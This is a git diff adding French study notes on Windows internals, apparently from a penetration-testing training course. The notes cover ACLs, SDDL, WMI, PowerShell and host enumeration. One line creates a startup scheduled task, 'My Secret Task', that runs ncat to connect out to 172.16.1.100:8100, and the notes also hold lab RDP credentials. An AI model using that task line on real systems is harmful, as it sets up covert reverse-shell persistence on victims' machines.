@@ -355,7 +355,7 @@ Cons of NTFS:
 La plupart des appareils mobiles ne prennent pas en charge NTFS nativement.
 Les périphériques multimédias plus anciens tels que les téléviseurs et les appareils photo numériques n'offrent pas de prise en charge des périphériques de stockage NTFS.
 
-#### Lise Controle d'acces (icacls) :
+#### Liste Controle d'acces (icacls) :
 
 icacls c:\windows
 
@@ -429,7 +429,259 @@ pour la session en cours
 
 ``sconfig``	Charger le menu Configuration du serveur dans Windows Server Core
 
-### Les comptes de Service :
+### Permissions de Service :
+
+    Il est fortement recommandé de créer un compte utilisateur individuel pour exécuter des services réseau critiques.Ces comptes sont appelés comptes de service
+
+`LocalSystem`  qui est le plus haut niveau d'accès autorisé sur un OS Windows individuel.
+
+
+Comptes de service intégrés notables dans Windows:
+--------------------------------------------------
+
+-   LocalService
+
+-   NetworkService
+
+-   LocalSyste
+ 
+ ``Les descripteurs`` de sécurité identifient le propriétaire d'object’s et un groupe primaire contenant un Discretionary Access Control List (DACL) et a System Access Control List (SACL')
+
+**Security Descriptor Definition Language (SDDL') :**
+`` D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)``
+
+D: - les caractères en cours sont des autorisations DACL
+AU: - définit le principe de sécurité Utilisateurs authentifiés
+A;; - l'accès est autorisé
+CC - SERVICE_QUERY_CONFIG est le nom complet, et c'est une requête au gestionnaire de contrôle de service (SCM) pour la configuration de service
+LC - SERVICE_QUERY_STATUS est le nom complet, et c'est une requête au gestionnaire de contrôle de service (SCM) pour l'état actuel du service
+SW - SERVICE_ENUMERATE_DEPENDENTS est le nom complet, et il va énumérer une liste de services dépendants
+RP - SERVICE_START est le nom complet, et il va démarrer le service
+LO - SERVICE_INTERROGATE est le nom complet, et il va interroger le service pour son état actuel
+RC - READ_CONTROL est le nom complet, et il va interroger le descripteur de sécurité du service
+
+Autorisation via powershell avec Get-ACL : 
+
+``Get-ACL -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List``
+
+
+### Windows Sessions : 
+
+Interactif 
+
+non-interatif : 
+
+**Compte local du system :** 
+- SYSTEM (GOD -_-)
+    - LocalService
+    - NetworkService
+
+### intéragir avec Windows OS
+
+#### Gui :
+
+#### RDP : 
+
+[https://learn.microsoft.com/en-US/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol
+](lien sur le protocol RDP de Microsoft)
+
+#### CLI : 
+
+get-alias
+Get-ExecutionPolicy -List
+
+### WMI
+
+**WMI est un sous-système de PowerShell**
+
+``WMI service``	Le processus Windows Management Instrumentation, qui s'exécute automatiquement au démarrage et sert d'intermédiaire entre les fournisseurs WMI, le référentiel WMI et la gestion des applications.
+
+``Objets gérés``	Tout composant logique ou physique pouvant être géré par WMI.
+
+``WMI fournisseurs``	Objets qui surveillent les événements/données liés à un objet spécifique.
+
+``Classes``	Ceux-ci sont utilisés par les fournisseurs WMI pour transmettre des données au service WMI.
+
+``Méthodes``	Ceux-ci sont attachés à des classes et permettent d'effectuer des actions. Par exemple, des méthodes peuvent être utilisées pour démarrer/arrêter des processus sur des machines distantes.
+
+``WMI dépôt``	Une base de données qui stocke toutes les données statiques liées à WMI.
+
+``CIM Gestionnaire d'Objets``	Le système qui demande des données aux fournisseurs WMI et les renvoie à l'application qui le demande.
+
+``API WMI API``	Permet aux applications d'accéder à l'infrastructure WMI.
+
+``WMI Consommateur``	Envoie des requêtes aux objets via le CIM Object Manager.
+
+
+Certaines des utilisations pour WMI sont:
+
+-   Informations d'état pour les systèmes locaux/éloignés
+-   Configuration des paramètres de sécurité sur les machines/applications distantes
+-   Définir et modifier les autorisations utilisateur et de groupe
+-   Définir/modifier les propriétés du système
+-   Exécution de code
+-   Planification des processus
+-   Configuration de la journalisation
+
+SSID des user : 
+  `wmic useraccount get name,sid`
+  `wmic group get name,sid`
+  ``Get-Wmiobject -Class Win32_UserAccount``
+  `Get-Wmiobject -Class Win32_Group`
+
+Login from Parrot Os : 
+`xfreerdp /v:STMIP /u:USER /p:PASSWORD /dynamic-resolution`
+`xfreerdp /v:10.129.217.240 /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution`
+# INTRODUCTION TO WINDOWS COMMAND LINE
+
+NE pas sous estimer l'élévation de privilege avec CMD.
+
+Find
+type
+more
+echo
+rm 
+md
+ren
+xcopy
+copy
+
+**systeminfo**
+    -   **Ceneral information**
+        -   hostname
+        -   os information
+            -   os name
+            -   os version 
+            -   os configuration
+            -   installed hotfix / package
+    -   **network information**
+        -   ip address
+        -   availaible network interface
+        -   accessible subet (route)
+        -   dns
+        -   localhost knows host
+        -   network ressource
+            -   network share
+            -   domain ressources
+            -   network devices (printer,etc)
+        -   host firewall config
+    -   **basic domaine information**
+        -   domaine name
+        -   logon server
+    -   **user information**
+        -   user account
+        -   local group
+        -   env variable
+        -   available task
+            -   currently running on host
+            -   scheduled tasks
+        -   Available Service
+            -   know antivirus Solutions
+            -   IDS / IPS Solution
+    
+
+Quelles informations système pouvons-nous tirer de notre hôte cible?
+Avec quel autre système(s) notre hôte cible interagit-il sur le réseau?
+À quel compte utilisateur(s) avons-nous accès et quelles informations sont accessibles depuis le compte(s)?
+À quel compte utilisateur avons-nous accès?
+À quels groupes appartient notre utilisateur?
+À quel ensemble de privilèges de travail notre utilisateur a-t-il accès?
+À quelles ressources nos utilisateurs peuvent-ils accéder via le réseau?
+Quelles tâches et quels services sont exécutés sous notre compte utilisateur?
+
+
+hostname
+systeminfo
+whoami
+whoami /priv
+whoami /groups
+ver
+ipconfig
+ipconfig /all
+arp /a
+net user
+net localgroup
+net share
+net view 
+where cmd 
+tree /F c:\ 
+tasklist /svc
+net start
+wmic service list brief  
+
+##  Scheduled Tasks  
+
+`SCHTASKS /Query /V /FO list`
+
+-    /create: pour lui dire ce que nous faisons
+-    /sc: nous devons établir un calendrier
+-   /tn: nous devons définir le nom
+-  /tr: nous devons lui donner une action à prendre
+  
+
+ `chtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"`
+
+ ##    Powershell
+
+Tache connu utlisé sur powerShell :
+
+Provisioning des serveurs et installation des rôles de serveur
+Création de comptes utilisateur Active Directory pour les nouveaux employés
+Gestion des autorisations de groupe Active Directory
+Désactivation et suppression des comptes utilisateurs Active Directory
+Gestion des autorisations de partage de fichiers
+Interagir avec Azure VMs AD et Azure
+Création, suppression et surveillance des répertoires et des fichiers
+Collecte d'informations sur les postes de travail et les serveurs
+Configuration des boîtes de réception Microsoft Exchange pour les utilisateurs (dans le cloud et/ou sur site)
+
+###    command:
+
+get-command
+get-command -verb get
+get-location
+
+### Module 
+
+get-module
+find-module
+Import-Module PowerShellGet
+Find-Module -Name AdminToolbox
+Install-Module -Name AdminToolbox -RequiredVersion 11.0.8
+
+### gestion des users & Group
+
+Type de compte :
+----------------
+ 
+Administrator	
+Default Account	
+Guest Account	
+WDAGUtility Account
+
+
+get-localgroup
+get-localuser
+New-LocalUser -Name "JLawrence" -NoPassword
+$Password = Read-Host -AsSecureString
+Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO EagleFang"
+Get-LocalGroupMember -Name "Users"
+Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"
+Get-LocalGroupMember -Name "Remote Desktop Users"
+
+Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
+Get-Module -Name ActiveDirectory -ListAvailable 
+
+
+
+![]Win32_UserAccount
+
+
+
+
+
+
+
 
 
 
